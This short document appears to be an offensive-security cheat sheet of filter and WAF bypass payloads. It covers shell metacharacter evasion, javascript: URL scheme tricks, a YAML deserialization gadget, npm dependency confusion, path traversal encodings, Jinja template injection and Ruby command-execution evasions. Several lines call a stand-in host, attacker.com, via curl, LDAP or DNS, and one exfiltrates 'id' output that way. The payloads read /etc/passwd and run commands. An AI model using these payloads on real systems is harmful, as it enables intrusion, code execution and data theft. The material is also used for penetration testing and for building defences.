## Bypass Techniques

### Bypass: Shell metacharacter filtering
```bash
# Blocked: ; | & ` $()
# Bypass using $IFS and encodings
cat${IFS}/etc/passwd
{cat,/etc/passwd}
$'\x63\x61\x74' /etc/passwd  # hex encoding
$(printf '\x63\x61\x74') /etc/passwd

# Newline injection when semicolons blocked
payload=$'\ncurl attacker.com\n'
```

### Bypass: URL scheme allowlist (javascript: blocked)
```
# Mobile apps often block javascript: but miss:
jAvAsCrIpT:alert(1)          # case variation
javascript&#58;alert(1)      # HTML entity
javascript:void(alert(1))    # void wrapper
intent://attacker.com#Intent;scheme=javascript;...
data:text/html,<script>alert(1)</script>
```

### Bypass: YAML safe_load / type restrictions
```yaml
# If !!java.* is blocked, try legitimate classes with side effects
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: 'ldap://attacker.com/a'
  autoCommit: true
# Or find allowlisted types with dangerous constructors
```

### Bypass: npm scope restrictions
```
# If @company/* is monitored, look for unscoped internal names
# e.g., "internal-utils" instead of "@company/internal-utils"
# Public registries serve unscoped packages first
```

### Bypass: Path traversal filters
```
# Basic filter bypass
../           → ..%2F → %2e%2e%2f → ....// 
# Double encoding
%252e%252e%252f
# Unicode normalization
..%c0%af  (overlong UTF-8)
# Null byte (older systems)
../../etc/passwd%00.jpg
```

### Bypass: Template injection with output filtering
```
# If {{ }} is sanitized on output but not evaluation:
{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
# Blind — use DNS callback instead of output
{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
```

### Bypass: WAF blocking `exec`, `system`, `popen`
```ruby
# Ruby
send(:system, "id")
method(:exec).call("id")
Kernel.send(:`, "id")
Object.const_get(:Kernel).system("id")
```

---

